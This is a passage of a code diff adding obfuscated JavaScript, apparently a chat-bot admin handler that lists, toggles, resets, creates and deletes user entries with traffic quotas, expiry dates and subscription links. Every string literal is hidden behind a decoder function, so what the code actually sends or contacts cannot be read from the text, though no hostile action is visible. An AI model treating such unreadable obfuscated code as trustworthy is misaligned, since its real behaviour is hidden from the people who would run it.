+      const var_abl = var_d[func_dec(57)] || false;
+      const var_abm = var_abl ? func_dec(1077) : func_dec(1078);
+      const var_abn = var_d[func_dec(67)] || [];
+      const var_abo = var_abn[func_dec(412)](var_abz => !var_abz[func_dec(57)] && (!var_abz[func_dec(71)] || Date[func_dec(170)]() <= var_abz[func_dec(71)]))[func_dec(135)];
+      const var_abp = var_abn[func_dec(412)](var_aca => var_aca[func_dec(57)] && !var_aca[func_dec(184)])[func_dec(135)];
+      const var_abq = var_abn[func_dec(412)](var_acb => var_acb[func_dec(57)] && var_acb[func_dec(184)])[func_dec(135)];
+      const var_abr = !var_abj || var_abj[func_dec(646)];
+      const var_abs = var_abj ? var_abj[func_dec(24)] : var_d[func_dec(24)] || func_dec(1059);
+      const var_abt = var_abr ? func_dec(1079) + var_abs + func_dec(3) : func_dec(491) + var_abs + func_dec(3);
+      let var_abu = func_dec(3) + func_eh(func_dec(684)) + func_dec(1080) + func_dec(1081) + (func_dec(1082) + func_eh(func_dec(818)) + func_dec(1083) + var_abt + func_dec(468)) + (func_dec(1084) + func_eh(func_dec(231)) + func_dec(1083) + (var_abl ? func_eh(func_dec(293)) : func_eh(func_dec(292))) + func_dec(448) + var_abm + func_dec(468)) + (func_dec(1085) + func_eh(func_dec(67)) + func_dec(1083) + var_abn[func_dec(135)] + func_dec(1086) + var_abo + func_dec(448) + func_eh(func_dec(785)) + func_dec(655) + var_abp + func_dec(448) + func_eh(func_dec(786)) + func_dec(655) + var_abq + func_dec(448) + func_eh(func_dec(787)) + func_dec(1087)) + func_dec(1088);
+      const var_abv = var_abr ? func_dec(301) + var_aai + func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(214) : null;
+      const var_abw = func_dec(301) + var_aai + func_dec(211) + var_d[func_dec(25)] + func_dec(3);
+      const var_abx = [];
+      if (var_abk) {
+        var_abx[func_dec(429)]([{
+          [func_dec(200)]: func_dec(1089) + func_eh(func_dec(67)) + func_dec(3),
+          [func_dec(480)]: func_dec(1090)
+        }, {
+          [func_dec(200)]: func_dec(1091) + func_eh(func_dec(420)) + func_dec(3),
+          [func_dec(480)]: func_dec(1092)
+        }]);
+      }
+      var_abx[func_dec(429)]([{
+        [func_dec(200)]: func_dec(478) + func_eh(func_dec(479)) + func_dec(3),
+        [func_dec(480)]: func_dec(481)
+      }, {
+        [func_dec(200)]: func_dec(482) + func_eh(func_dec(483)) + func_dec(3),
+        [func_dec(480)]: func_dec(484)
+      }]);
+      var_abx[func_dec(429)]([{
+        [func_dec(200)]: func_dec(485) + func_eh(func_dec(486)) + func_dec(3),
+        [func_dec(480)]: func_dec(487)
+      }]);
+      if (var_abk) {
+        var_abx[func_dec(429)]([{
+          [func_dec(200)]: func_dec(1093) + func_eh(func_dec(758)) + func_dec(3),
+          [func_dec(480)]: func_dec(1094)
+        }]);
+        var_abx[func_dec(429)]([{
+          [func_dec(200)]: func_dec(1095) + func_eh(func_dec(837)) + func_dec(3),
+          [func_dec(480)]: func_dec(1096)
+        }, {
+          [func_dec(200)]: func_dec(1097) + func_eh(func_dec(839)) + func_dec(3),
+          [func_dec(480)]: func_dec(1098)
+        }]);
+        var_abx[func_dec(429)]([{
+          [func_dec(200)]: func_dec(1099) + func_eh(func_dec(841)) + func_dec(3),
+          [func_dec(480)]: func_dec(1100)
+        }]);
+      }
+      var_abx[func_dec(429)]([{
+        [func_dec(200)]: func_dec(491) + (var_aam === func_dec(66) ? func_dec(492) : func_dec(493)) + func_dec(3),
+        [func_dec(480)]: func_dec(494)
+      }, {
+        [func_dec(200)]: var_abl ? func_dec(495) + func_eh(func_dec(496)) + func_dec(3) : func_dec(497) + func_eh(func_dec(498)) + func_dec(3),
+        [func_dec(480)]: func_dec(499)
+      }]);
+      if (var_abv) {
+        var_abx[func_dec(429)]([{
+          [func_dec(200)]: func_dec(500) + func_eh(func_dec(213)) + func_dec(3),
+          [func_dec(501)]: {
+            [func_dec(206)]: var_abv
+          }
+        }, {
+          [func_dec(200)]: func_dec(488) + func_eh(func_dec(489)) + func_dec(3),
+          [func_dec(480)]: func_dec(490)
+        }]);
+        if (var_abk) {
+          var_abx[func_dec(429)]([{
+            [func_dec(200)]: func_dec(1101) + func_eh(func_dec(690)) + func_dec(3),
+            [func_dec(480)]: func_dec(1102)
+          }]);
+        }
+      } else {
+        var_abx[func_dec(429)]([{
+          [func_dec(200)]: func_dec(488) + func_eh(func_dec(489)) + func_dec(3),
+          [func_dec(480)]: func_dec(490)
+        }]);
+      }
+      const var_aby = {
+        [func_dec(504)]: var_abx
+      };
+      return {
+        [func_dec(200)]: var_abu,
+        [func_dec(1103)]: var_aby
+      };
+    };
+    const func_el = (var_acc = 0, var_acd = null) => {
+      const var_ace = var_acd || var_d[func_dec(67)] || [];
+      const var_acf = 5;
+      const var_acg = Math[func_dec(142)](var_ace[func_dec(135)] / var_acf);
+      const var_ach = var_acc * var_acf;
+      const var_aci = var_ach + var_acf;
+      const var_acj = var_ace[func_dec(145)](var_ach, var_aci);
+      let var_ack = func_dec(1085) + func_eh(func_dec(67)) + func_dec(1104) + func_eh(func_dec(814)) + func_dec(448) + (var_acc + 1) + func_dec(211) + Math[func_dec(5)](1, var_acg) + func_dec(1087);
+      var_ack += func_dec(1081);
+      if (var_ace[func_dec(135)] === 0) {
+        var_ack += func_dec(1105) + func_eh(func_dec(701)) + func_dec(468);
+      } else {
+        var_acj[func_dec(176)]((var_acn, var_aco) => {
+          var_ack += func_dec(3) + (var_ach + var_aco + 1) + func_dec(1106) + var_acn[func_dec(24)] + func_dec(1107) + var_acn[func_dec(172)] + func_dec(1108);
+        });
+      }
+      var_ack += func_dec(1088);
+      const var_acl = [];
+      var_acj[func_dec(176)](var_acp => {
+        var_acl[func_dec(429)]([{
+          [func_dec(200)]: func_dec(1109) + var_acp[func_dec(24)] + func_dec(3),
+          [func_dec(480)]: func_dec(1110) + var_acp[func_dec(172)] + func_dec(3)
+        }]);
+      });
+      const var_acm = [];
+      if (var_acc > 0) {
+        var_acm[func_dec(429)]({
+          [func_dec(200)]: func_dec(1111) + func_eh(func_dec(716)) + func_dec(3),
+          [func_dec(480)]: func_dec(1112) + (var_acc - 1) + func_dec(3)
+        });
+      }
+      if (var_aci < var_ace[func_dec(135)]) {
+        var_acm[func_dec(429)]({
+          [func_dec(200)]: func_dec(3) + func_eh(func_dec(718)) + func_dec(1113),
+          [func_dec(480)]: func_dec(1112) + (var_acc + 1) + func_dec(3)
+        });
+      }
+      if (var_acm[func_dec(135)] > 0) {
+        var_acl[func_dec(429)](var_acm);
+      }
+      var_acl[func_dec(429)]([{
+        [func_dec(200)]: func_dec(1114) + func_eh(func_dec(728)) + func_dec(3),
+        [func_dec(480)]: func_dec(1115)
+      }]);
+      var_acl[func_dec(429)]([{
+        [func_dec(200)]: func_eh(func_dec(798)),
+        [func_dec(480)]: func_dec(1116)
+      }]);
+      return {
+        [func_dec(200)]: var_ack,
+        [func_dec(1103)]: {
+          [func_dec(504)]: var_acl
+        }
+      };
+    };
+    const func_em = (var_acq, var_acr = null) => {
+      const var_acs = var_acr || var_d[func_dec(67)] || [];
+      const var_act = var_acs[func_dec(260)](var_ads => var_ads[func_dec(172)] === var_acq);
+      if (!var_act) {
+        return {
+          [func_dec(200)]: func_dec(811),
+          [func_dec(1103)]: {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_eh(func_dec(716)),
+              [func_dec(480)]: func_dec(1090)
+            }]]
+          }
+        };
+      }
+      const var_acu = var_t?.[func_dec(67)]?.[var_act[func_dec(172)][func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)]()] || {
+        [func_dec(17)]: 0,
+        [func_dec(23)]: 0,
+        [func_dec(21)]: func_dec(3)
+      };
+      const var_acv = var_acu[func_dec(17)] || 0;
+      const var_acw = new Date()[func_dec(19)]()[func_dec(18)](func_dec(20))[0];
+      const var_acx = var_acu[func_dec(21)] === var_acw ? var_acu[func_dec(23)] || 0 : 0;
+      const var_acy = var_act[func_dec(70)] ? func_dec(3) + var_act[func_dec(70)] + func_dec(3) : func_eh(func_dec(714));
+      const var_acz = var_act[func_dec(288)] ? func_dec(3) + var_act[func_dec(288)] + func_dec(3) : func_eh(func_dec(714));
+      const var_ada = (func_f(var_acu) / 1073741824)[func_dec(180)](2);
+      const var_adb = var_act[func_dec(70)] ? (func_h(var_act[func_dec(70)]) / 1073741824)[func_dec(180)](2) : func_eh(func_dec(714));
+      let var_adc = func_eh(func_dec(714));
+      let var_add = false;
+      let var_ade = func_eh(func_dec(714));
+      if (var_act[func_dec(71)]) {
+        const var_adt = new Date(var_act[func_dec(71)]);
+        var_adc = var_adt[func_dec(179)]();
+        const var_adu = Math[func_dec(142)]((var_act[func_dec(71)] - Date[func_dec(170)]()) / 86400000);
+        var_ade = var_adu >= 0 ? func_dec(3) + var_adu + func_dec(3) : func_dec(148);
+        if (Date[func_dec(170)]() > var_act[func_dec(71)]) {
+          var_adc += func_dec(1086) + func_eh(func_dec(794)) + func_dec(1117);
+          var_add = true;
+        }
+      }
+      const var_adf = var_act[func_dec(57)] ? func_dec(1118) : var_add ? func_dec(1077) : func_dec(1078);
+      const var_adg = var_act[func_dec(57)] ? func_eh(func_dec(293)) : var_add ? func_eh(func_dec(794)) : func_eh(func_dec(292));
+      const var_adh = func_dec(301) + var_aai + func_dec(211) + var_d[func_dec(25)] + func_dec(521) + encodeURIComponent(var_act[func_dec(24)]) + func_dec(3);
+      const var_adi = var_act[func_dec(526)] || func_eh(func_dec(714));
+      const var_adj = var_act[func_dec(515)] || func_eh(func_dec(812));
+      const var_adk = var_act[func_dec(529)] ? var_act[func_dec(529)] === func_dec(39) ? func_dec(1119) : var_act[func_dec(529)] === func_dec(1120) ? func_dec(1121) : func_dec(1122) : func_eh(func_dec(714));
+      const var_adl = var_act[func_dec(530)] || func_eh(func_dec(714));
+      const var_adm = var_act[func_dec(528)] ? var_act[func_dec(528)][func_dec(158)](0, 30) + (var_act[func_dec(528)][func_dec(135)] > 30 ? func_dec(627) : func_dec(3)) : func_dec(1123);
+      const var_adn = var_act[func_dec(527)] ? var_act[func_dec(527)][func_dec(158)](0, 30) + (var_act[func_dec(527)][func_dec(135)] > 30 ? func_dec(627) : func_dec(3)) : func_dec(1123);
+      const var_ado = var_act[func_dec(531)] ? var_act[func_dec(531)][func_dec(158)](0, 30) + (var_act[func_dec(531)][func_dec(135)] > 30 ? func_dec(627) : func_dec(3)) : func_dec(1123);
+      const var_adp = var_act[func_dec(532)] || func_dec(1123);
+      let var_adq = func_dec(1124) + func_eh(func_dec(703)) + func_dec(1125);
+      var_adq += func_dec(1081);
+      var_adq += func_dec(1126) + func_eh(func_dec(24)) + func_dec(1083) + var_act[func_dec(24)] + func_dec(468);
+      var_adq += func_dec(1127) + var_act[func_dec(172)] + func_dec(1108);
+      var_adq += func_dec(1128) + func_eh(func_dec(806)) + func_dec(1083) + var_adf + func_dec(448) + var_adg + func_dec(468);
+      var_adq += func_dec(1129) + func_eh(func_dec(518)) + func_dec(1083) + var_ada + func_dec(1130) + var_adb + func_dec(1131) + var_acv + func_dec(1132);
+      var_adq += func_dec(1133) + func_eh(func_dec(519)) + func_dec(1083) + var_acx + func_dec(1134) + var_acz + func_dec(468);
+      var_adq += func_dec(1135) + func_eh(func_dec(708)) + func_dec(1083) + var_adc + func_dec(468);
+      var_adq += func_dec(1136) + func_eh(func_dec(710)) + func_dec(1083) + var_ade + func_dec(468);
+      var_adq += func_dec(1137) + func_eh(func_dec(916)) + func_dec(1083) + var_adk + func_dec(468);
+      var_adq += func_dec(1138) + func_eh(func_dec(918)) + func_dec(1083) + var_adl + func_dec(468);
+      var_adq += func_dec(1139) + func_eh(func_dec(765)) + func_dec(1083) + var_adi + func_dec(468);
+      var_adq += func_dec(1140) + func_eh(func_dec(911)) + func_dec(1083) + var_adm + func_dec(468);
+      var_adq += func_dec(1141) + func_eh(func_dec(912)) + func_dec(1083) + var_adn + func_dec(468);
+      var_adq += func_dec(1142) + func_eh(func_dec(914)) + func_dec(1083) + var_ado + func_dec(468);
+      var_adq += func_dec(1143) + func_eh(func_dec(915)) + func_dec(1083) + var_adp + func_dec(468);
+      var_adq += func_dec(1141) + func_eh(func_dec(919)) + func_dec(1083) + (var_act[func_dec(533)] || func_eh(func_dec(714))) + func_dec(468);
+      var_adq += func_dec(1144) + func_eh(func_dec(921)) + func_dec(1083) + (var_act[func_dec(298)] || func_eh(func_dec(714))) + func_dec(468);
+      var_adq += func_dec(1145) + func_eh(func_dec(515)) + func_dec(1083) + var_adj + func_dec(468);
+      var_adq += func_dec(1081);
+      var_adq += func_dec(1141) + func_eh(func_dec(808)) + func_dec(1146) + var_adh + func_dec(1071);
+      const var_adr = {
+        [func_dec(504)]: [[{
+          [func_dec(200)]: var_act[func_dec(57)] ? func_dec(495) + func_eh(func_dec(496)) + func_dec(3) : func_dec(497) + func_eh(func_dec(498)) + func_dec(3),
+          [func_dec(480)]: func_dec(1147) + var_act[func_dec(172)] + func_dec(3)
+        }, {
+          [func_dec(200)]: func_dec(1148) + func_eh(func_dec(720)) + func_dec(3),
+          [func_dec(480)]: func_dec(1149) + var_act[func_dec(172)] + func_dec(3)
+        }], [{
+          [func_dec(200)]: func_dec(1150) + func_eh(func_dec(724)) + func_dec(3),
+          [func_dec(480)]: func_dec(1151) + var_act[func_dec(172)] + func_dec(3)
+        }, {
+          [func_dec(200)]: func_dec(1095) + func_eh(func_dec(726)) + func_dec(3),
+          [func_dec(480)]: func_dec(1152) + var_act[func_dec(172)] + func_dec(3)
+        }], [{
+          [func_dec(200)]: func_dec(1153) + func_eh(func_dec(760)) + func_dec(3),
+          [func_dec(480)]: func_dec(1154) + var_act[func_dec(172)] + func_dec(3)
+        }, {
+          [func_dec(200)]: func_dec(1155) + func_eh(func_dec(762)) + func_dec(3),
+          [func_dec(480)]: func_dec(1156) + var_act[func_dec(172)] + func_dec(3)
+        }], [{
+          [func_dec(200)]: func_dec(1157) + func_eh(func_dec(515)) + func_dec(3),
+          [func_dec(480)]: func_dec(1158) + var_act[func_dec(172)] + func_dec(3)
+        }, {
+          [func_dec(200)]: func_dec(1159) + func_eh(func_dec(765)) + func_dec(3),
+          [func_dec(480)]: func_dec(1160) + var_act[func_dec(172)] + func_dec(3)
+        }], [{
+          [func_dec(200)]: func_eh(func_dec(800)),
+          [func_dec(480)]: func_dec(1090)
+        }]]
+      };
+      return {
+        [func_dec(200)]: var_adq,
+        [func_dec(1103)]: var_adr
+      };
+    };
+    if (var_aak[func_dec(1068)]) {
+      const var_adv = var_aak[func_dec(1068)];
+      const var_adw = var_adv[func_dec(410)]?.[func_dec(1069)]?.[func_dec(172)];
+      const var_adx = var_adv[func_dec(410)]?.[func_dec(1074)];
+      const var_ady = var_adv[func_dec(212)];
+      if (var_adw) {
+        if (!var_aap) {
+          await func_e(func_dec(3) + var_aal + func_dec(1161), {
+            [func_dec(123)]: func_dec(197),
+            [func_dec(104)]: {
+              [func_dec(198)]: func_dec(121)
+            },
+            [func_dec(125)]: JSON[func_dec(119)]({
+              [func_dec(1162)]: var_adv[func_dec(172)],
+              [func_dec(200)]: func_eh(func_dec(752)),
+              [func_dec(1163)]: true
+            })
+          });
+          return new Response(func_dec(509), {
+            [func_dec(231)]: 200
+          });
+        }
+        const var_adz = func_ei();
+        const var_aea = var_adz && !var_adz[func_dec(646)];
+        const func_en = async () => {
+          if (var_aea) {
+            const var_aec = await func_az(var_adz);
+            return var_aec[func_dec(108)] ? var_aec[func_dec(67)] || [] : null;
+          }
+          return var_d[func_dec(67)] || [];
+        };
+        var_aaq[var_adw] = null;
+        var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+        let var_aeb = null;
+        if (var_ady === func_dec(1116)) {
+          const var_aed = func_ek(var_adz, var_aap);
+          await func_ej(var_adw, var_aed[func_dec(200)], var_aed[func_dec(1103)], var_adx);
+        } else if (var_ady === func_dec(494)) {
+          var_d[func_dec(65)] = var_aam === func_dec(66) ? func_dec(477) : func_dec(66);
+          await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+          const var_aee = func_ek(var_adz, var_aap);
+          await func_ej(var_adw, var_aee[func_dec(200)], var_aee[func_dec(1103)], var_adx);
+        } else if (var_ady === func_dec(499)) {
+          var_d[func_dec(57)] = !var_d[func_dec(57)];
+          await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+          const var_aef = func_ek(var_adz, var_aap);
+          await func_ej(var_adw, var_aef[func_dec(200)], var_aef[func_dec(1103)], var_adx);
+        } else if (var_ady === func_dec(1164)) {
+          let var_aeg = func_eh(func_dec(714));
+          if (var_d[func_dec(54)] && var_d[func_dec(55)]) {
+            const var_aem = await func_aj(var_d[func_dec(54)], var_d[func_dec(55)]);
+            if (var_aem !== null) {
+              const var_aen = (var_aem / 100000 * 100)[func_dec(180)](2);
+              var_aeg = func_dec(3) + var_aem + func_dec(1165) + var_aen + func_dec(1166);
+            }
+          }
+          const var_aeh = Math[func_dec(16)]((Date[func_dec(170)]() - var_e) / 1000);
+          const var_aei = Math[func_dec(16)](var_aeh / 3600);
+          const var_aej = Math[func_dec(16)](var_aeh % 3600 / 60);
+          let var_aek = func_dec(1137) + func_eh(func_dec(688)) + func_dec(1125);
+          var_aek += func_dec(1081);
+          var_aek += func_dec(1133) + func_eh(func_dec(697)) + func_dec(1083) + var_aei + func_dec(1167) + var_aej + func_dec(1168);
+          var_aek += func_dec(1138) + func_eh(func_dec(699)) + func_dec(1083) + var_f + func_dec(468);
+          var_aek += func_dec(1169) + var_aeg + func_dec(468);
+          var_aek += func_dec(1088);
+          const var_ael = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_eh(func_dec(798)),
+              [func_dec(480)]: func_dec(1116)
+            }]]
+          };
+          await func_ej(var_adw, var_aek, var_ael, var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1112))) {
+          const var_aeo = parseInt(var_ady[func_dec(155)](func_dec(1112), func_dec(3))) || 0;
+          const var_aep = await func_en();
+          if (var_aep === null && var_aea) {
+            await func_ej(var_adw, func_eh(func_dec(828)), {
+              [func_dec(504)]: [[{
+                [func_dec(200)]: func_eh(func_dec(798)),
+                [func_dec(480)]: func_dec(1116)
+              }]]
+            });
+          } else {
+            const var_aeq = func_el(var_aeo, var_aep);
+            await func_ej(var_adw, var_aeq[func_dec(200)], var_aeq[func_dec(1103)], var_adx);
+          }
+        } else if (var_ady[func_dec(299)](func_dec(1110))) {
+          const var_aer = var_ady[func_dec(155)](func_dec(1110), func_dec(3));
+          const var_aes = await func_en();
+          if (var_aes === null && var_aea) {
+            await func_ej(var_adw, func_eh(func_dec(828)), {
+              [func_dec(504)]: [[{
+                [func_dec(200)]: func_eh(func_dec(798)),
+                [func_dec(480)]: func_dec(1116)
+              }]]
+            });
+          } else {
+            const var_aet = func_em(var_aer, var_aes);
+            await func_ej(var_adw, var_aet[func_dec(200)], var_aet[func_dec(1103)], var_adx);
+          }
+        } else if (var_ady[func_dec(299)](func_dec(1147))) {
+          const var_aeu = var_ady[func_dec(155)](func_dec(1147), func_dec(3));
+          if (var_aea) {
+            await func_be(var_adz, var_aeu);
+          } else if (var_d[func_dec(67)]) {
+            const var_aex = var_d[func_dec(67)][func_dec(260)](var_aey => var_aey[func_dec(172)] === var_aeu);
+            if (var_aex) {
+              var_aex[func_dec(57)] = !var_aex[func_dec(57)];
+              await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+            }
+          }
+          const var_aev = await func_en();
+          const var_aew = func_em(var_aeu, var_aev);
+          await func_ej(var_adw, var_aew[func_dec(200)], var_aew[func_dec(1103)], var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1149))) {
+          const var_aez = var_ady[func_dec(155)](func_dec(1149), func_dec(3));
+          const var_afa = await func_en();
+          const var_afb = var_afa?.[func_dec(260)](var_aff => var_aff[func_dec(172)] === var_aez);
+          const var_afc = var_afb ? var_afb[func_dec(24)] : func_dec(3);
+          const var_afd = func_dec(3) + func_eh(func_dec(746)) + func_dec(1170) + var_afc + func_dec(1171);
+          const var_afe = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1172) + func_eh(func_dec(730)) + func_dec(3),
+              [func_dec(480)]: func_dec(1173) + var_aez + func_dec(3)
+            }, {
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)) + func_dec(3),
+              [func_dec(480)]: func_dec(1110) + var_aez + func_dec(3)
+            }]]
+          };
+          await func_ej(var_adw, var_afd, var_afe, var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1173))) {
+          const var_afg = var_ady[func_dec(155)](func_dec(1173), func_dec(3));
+          if (var_aea) {
+            await func_bd(var_adz, func_dec(556), var_afg);
+          } else if (var_d[func_dec(67)]) {
+            var_d[func_dec(67)] = var_d[func_dec(67)][func_dec(412)](var_afj => var_afj[func_dec(172)] !== var_afg);
+            await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+          }
+          const var_afh = func_dec(1172) + func_eh(func_dec(738)) + func_dec(3);
+          const var_afi = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_eh(func_dec(716)),
+              [func_dec(480)]: func_dec(1090)
+            }]]
+          };
+          await func_ej(var_adw, var_afh, var_afi, var_adx);
+        } else if (var_ady === func_dec(1115)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1176)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          const var_afk = func_dec(1114) + func_eh(func_dec(734)) + func_dec(3);
+          const var_afl = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)) + func_dec(3),
+              [func_dec(480)]: func_dec(1090)
+            }]]
+          };
+          await func_ej(var_adw, var_afk, var_afl, var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1151))) {
+          const var_afm = var_ady[func_dec(155)](func_dec(1151), func_dec(3));
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1177) + var_afm + func_dec(3)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          const var_afn = func_dec(1150) + func_eh(func_dec(734)) + func_dec(3);
+          const var_afo = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)) + func_dec(3),
+              [func_dec(480)]: func_dec(1110) + var_afm + func_dec(3)
+            }]]
+          };
+          await func_ej(var_adw, var_afn, var_afo, var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1152))) {
+          const var_afp = var_ady[func_dec(155)](func_dec(1152), func_dec(3));
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1178) + var_afp + func_dec(3)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          const var_afq = func_dec(1095) + func_eh(func_dec(744)) + func_dec(3);
+          const var_afr = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1179),
+              [func_dec(480)]: func_dec(1180) + var_afp + func_dec(3)
+            }], [{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)) + func_dec(3),
+              [func_dec(480)]: func_dec(1110) + var_afp + func_dec(3)
+            }]]
+          };
+          await func_ej(var_adw, var_afq, var_afr, var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1180))) {
+          const var_afs = var_ady[func_dec(155)](func_dec(1180), func_dec(3));
+          if (var_aea) {
+            await func_bd(var_adz, func_dec(124), var_afs, {
+              [func_dec(163)]: var_adz[func_dec(402)],
+              [func_dec(524)]: 0,
+              [func_dec(296)]: 0,
+              [func_dec(525)]: 0
+            });
+          } else if (var_d[func_dec(67)]) {
+            const var_afv = var_d[func_dec(67)][func_dec(260)](var_afw => var_afw[func_dec(172)] === var_afs);
+            if (var_afv) {
+              var_afv[func_dec(70)] = null;
+              var_afv[func_dec(288)] = null;
+              var_afv[func_dec(71)] = null;
+              await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+            }
+          }
+          const var_aft = await func_en();
+          const var_afu = func_em(var_afs, var_aft);
+          await func_ej(var_adw, var_afu[func_dec(200)], var_afu[func_dec(1103)], var_adx);
+        } else if (var_ady === func_dec(1181)) {
+          let var_afx = func_dec(1182);
+          try {
+            const var_afz = await func_r(var_aah, func_dec(1072));
+            if (var_afz) {
+              const var_aga = JSON[func_dec(388)](var_afz);
+              if (var_aga[var_adw] && var_aga[var_adw][func_dec(24)]) {
+                var_afx = var_aga[var_adw][func_dec(24)];
+              }
+            }
+          } catch (var_agb) {}
+          const var_afy = crypto[func_dec(167)]();
+          if (var_aea) {
+            const var_agc = await func_bd(var_adz, func_dec(197), null, {
+              [func_dec(163)]: var_adz[func_dec(402)],
+              [func_dec(24)]: var_afx
+            });
+            if (var_agc[func_dec(108)] && var_agc[func_dec(522)]) {
+              const var_agd = func_em(var_agc[func_dec(522)][func_dec(172)], [var_agc[func_dec(522)]]);
+              await func_ej(var_adw, func_dec(1172) + func_eh(func_dec(736)) + func_dec(1080) + var_agd[func_dec(200)] + func_dec(3), var_agd[func_dec(1103)], var_adx);
+            } else {
+              await func_ej(var_adw, func_eh(func_dec(828)), {
+                [func_dec(504)]: [[{
+                  [func_dec(200)]: func_eh(func_dec(798)),
+                  [func_dec(480)]: func_dec(1116)
+                }]]
+              });
+            }
+          } else {
+            if (!var_d[func_dec(67)]) var_d[func_dec(67)] = [];
+            var_d[func_dec(67)][func_dec(429)]({
+              [func_dec(172)]: var_afy,
+              [func_dec(24)]: var_afx,
+              [func_dec(70)]: null,
+              [func_dec(288)]: null,
+              [func_dec(71)]: null,
+              [func_dec(174)]: Date[func_dec(170)]()
+            });
+            await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+            const var_age = func_em(var_afy);
+            await func_ej(var_adw, func_dec(1172) + func_eh(func_dec(736)) + func_dec(1080) + var_age[func_dec(200)] + func_dec(3), var_age[func_dec(1103)], var_adx);
+          }
+          var_aaq[var_adw] = null;
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+        } else if (var_ady === func_dec(1102)) {
+          const var_agf = func_dec(3) + func_eh(func_dec(748)) + func_dec(3);
+          const var_agg = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1183),
+              [func_dec(480)]: func_dec(1184)
+            }, {
+              [func_dec(200)]: func_dec(1185),
+              [func_dec(480)]: func_dec(1116)
+            }]]
+          };
+          await func_ej(var_adw, var_agf, var_agg, var_adx);
+        } else if (var_ady === func_dec(1184)) {
+          var_d[func_dec(25)] = Array[func_dec(417)](crypto[func_dec(1186)](new Uint8Array(8)))[func_dec(144)](var_agj => var_agj[func_dec(147)](16)[func_dec(146)](2, func_dec(148)))[func_dec(143)](func_dec(3));
+          var_d[func_dec(57)] = true;
+          await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+          const var_agh = func_dec(3) + func_eh(func_dec(740)) + func_dec(1187);
+          const var_agi = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_eh(func_dec(798)),
+              [func_dec(480)]: func_dec(1116)
+            }]]
+          };
+          await func_ej(var_adw, var_agh, var_agi, var_adx);
+        } else if (var_ady === func_dec(481)) {
+          let var_agk, var_agl, var_agm, var_agn, var_ago;
+          if (var_aea) {
+            const var_agr = await func_bb(var_adz);
+            if (var_agr[func_dec(108)] && var_agr[func_dec(225)]) {
+              const var_ags = var_agr[func_dec(225)];
+              var_agk = [];
+              var_agl = var_ags[func_dec(67)]?.[func_dec(292)] || 0;
+              var_agm = var_ags[func_dec(67)]?.[func_dec(293)] || 0;
+              var_agn = var_ags[func_dec(67)]?.[func_dec(294)] || 0;
+              var_ago = var_ags[func_dec(67)]?.[func_dec(581)] || 0;
+            } else {
+              const var_agt = await func_en();
+              var_agk = var_agt || [];
+              var_agl = var_agk[func_dec(412)](var_agu => !var_agu[func_dec(57)] && (!var_agu[func_dec(71)] || Date[func_dec(170)]() <= var_agu[func_dec(71)]))[func_dec(135)];
+              var_agm = var_agk[func_dec(412)](var_agv => var_agv[func_dec(57)] && !var_agv[func_dec(184)])[func_dec(135)];
+              var_agn = var_agk[func_dec(412)](var_agw => var_agw[func_dec(71)] && Date[func_dec(170)]() > var_agw[func_dec(71)] && !var_agw[func_dec(57)])[func_dec(135)];
+              var_ago = var_agk[func_dec(412)](var_agx => var_agx[func_dec(57)] && var_agx[func_dec(184)])[func_dec(135)];
+            }
+          } else {
+            var_agk = var_d[func_dec(67)] || [];
+            var_agl = var_agk[func_dec(412)](var_agy => !var_agy[func_dec(57)] && (!var_agy[func_dec(71)] || Date[func_dec(170)]() <= var_agy[func_dec(71)]))[func_dec(135)];
+            var_agm = var_agk[func_dec(412)](var_agz => var_agz[func_dec(57)] && !var_agz[func_dec(184)])[func_dec(135)];
+            var_agn = var_agk[func_dec(412)](var_aha => var_aha[func_dec(71)] && Date[func_dec(170)]() > var_aha[func_dec(71)] && !var_aha[func_dec(57)])[func_dec(135)];
+            var_ago = var_agk[func_dec(412)](var_ahb => var_ahb[func_dec(57)] && var_ahb[func_dec(184)])[func_dec(135)];
+          }
+          let var_agp = func_dec(1129) + func_eh(func_dec(479)) + func_dec(1125);
+          var_agp += func_dec(1081);
